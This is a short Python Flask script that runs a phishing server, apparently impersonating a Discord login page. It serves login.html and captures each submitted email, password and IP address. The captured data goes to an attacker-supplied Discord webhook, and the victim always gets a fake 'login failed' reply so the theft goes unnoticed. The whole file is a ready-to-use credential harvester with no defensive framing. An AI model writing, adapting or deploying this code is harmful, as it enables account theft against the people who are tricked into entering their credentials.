from flask import Flask, send_file, request
from datetime import datetime
import requests
import os

app = Flask(__name__)


WEBHOOK_URL = <use you web hook url> 

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login.html')
def login():
    return send_file('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    print("Login request received")
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    
    try:
        message = {
            "embeds": [{
                "title": "Get new Discord info",
                "description": "**New Login Attempt**",
                "color": 0xFF0000, 
                "fields": [
                    {"name": "Account", "value": email, "inline": True},
                    {"name": "Password", "value": password, "inline": True},
                    {"name": "IP address", "value": ip, "inline": True},
                    {"name": "Time", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False}
                ]
            }]
        }
        # send to Discord
        response = requests.post(WEBHOOK_URL, json=message)
        if response.status_code == 204:
            print("成功發送到 Discord")
            
        return {'status': 'error', 'message': '登入失敗'}, 401
        
    except Exception as e:
        print(f"發送訊息時發生錯誤: {e}")
        return {'status': 'error', 'message': '系統錯誤'}, 500

if __name__ == '__main__':
    print("Running Web Server...")
    print("visit http://localhost:5000 Check login.html")
    app.run(host='0.0.0.0', port=5000, debug=False) #Can set to True for debug mode